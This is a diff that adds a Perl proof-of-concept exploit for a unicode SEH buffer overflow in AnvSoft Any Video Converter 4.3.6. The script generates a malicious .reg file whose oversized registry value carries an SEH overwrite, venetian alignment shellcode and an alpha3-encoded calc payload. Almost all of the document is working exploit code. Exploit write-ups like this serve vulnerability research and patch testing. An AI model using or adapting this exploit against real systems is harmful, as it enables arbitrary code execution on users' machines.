@@ -1,0 +1,58 @@
+# Exploit Title: AnvSoft Any Video Converter 4.3.6 unicode buffer overflow.
+# Software Link: http://www.any-video-converter.com
+# Version: 4.3.6
+# References: http://www.exploit-db.com/exploits/18717/
+#             http://www.vulnerability-lab.com/get_content.php?id=492
+# Credits: Vulnerability Research Laboratory Team
+# Tested on: Win XP SP3 French
+# trigger the bug : generate the .reg file, execute it, and then open the app
+# Date: 12/05/2012
+# Author: h1ch4m (Hicham Oumounid)
+# Email: h1ch4m@live.fr
+# Home: http://net-effects.blogspot.com
+# Big thanks to corelanc0d3r and thanks to all for sharing knowledge
+
+my $file ="poc.reg";
+
+$junk = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9" .
+        "Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9" .
+		"Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9" .
+		"Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9" .
+		"Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3";
+
+my $xploit = "Windows Registry Editor Version 5.00\n\n";
+$xploit .= "[HKEY_CURRENT_USER\\Software\\AnvSoft\\Any Video Converter Ultimate\\Setting\\Output]\n\"OutputFolder\"=\"";
+$xploit .= $junk;           # junk
+
+$xploit .= "\x59\x21";      # next seh = POP ECX + ADD BYTE PTR DS:[ESI],CH
+$xploit .= "\x61\x4e";      #      seh = ADD ESP,8 # RETN 04  #  0x004E0061
+
+# The Venetian Shellcode
+$xploit .= "\x41";                   # \x00\x41\x00 = ADD BYTE PTR DS:[ECX],AL
+$xploit .= "\x58";                   # \x58 = POP EAX
+$xploit .= "\x41";                   # \x00\x41\x00 = ADD BYTE PTR DS:[ECX],AL
+$xploit .= "\xbb\x1e\x11";           # MOV EBX, 0x10002000
+$xploit .= "\xf8";                   # ADD AL,BH
+$xploit .= "\x41";                   # \x00\x41\x00 = ADD BYTE PTR DS:[ECX],AL
+$xploit .= "\x50";                   # push eax
+$xploit .= "\x41";                   # \x00\x41\x00 = ADD BYTE PTR DS:[ECX],AL
+$xploit .= "\xc3";                   # ret  
+
+# alpha3 encoded ascii uppercase calc Shellcode, base register = EAX
+$xploit .= "PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11" .
+"AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBNK8" .
+"I8ZXQXY44MTL4QN6QP2VXVBDOTROCNQPFLVLCOVLVU3JNQNRM37XO2VKKCXNP3VULK" .
+"QIEVWTNCFEMIUMNKLL3LEJ4PP9PUN4XCLLGLWLV1KMV5XF6C3JDBJWHMOJW7NMJMQP" .
+"87CQKS6O5OKM9OOMQYYGN042WP1GNUJJSKY6X5OWTKM2R5QMD6MKYZITLGV26WZVML" .
+"KSUOFZGMPSN8LJVYPPNNMWY8LMMN0K5Y1QL0TI2OINK6NNP7TNLSEPJLRVX2HJLHQL" .
+"ZOYLLNVKLMJKRL3SZOULGKRQNKNNSTOQQJ1VU8KQ5ZU5NTHYT6LSJSOLXVNMSMPWLV" .
+"D8FP5XFJF4LY8PJEMJHGZQDUNPZURQUMENU6UBYKL2QOYP0QMYCGQUMP731TLMMYRF" .
+"F5XUMKW0WPOGMBMB2N42YUMNNLEJL5QUMMVMUGRQ084UUKUSYA";
+
+$xploit .= $junk x 15 ."\"";
+
+open($FILE,">$file");
+print $FILE $xploit;
+close($FILE);
+print "File Created successfully\n";
+sleep(1);
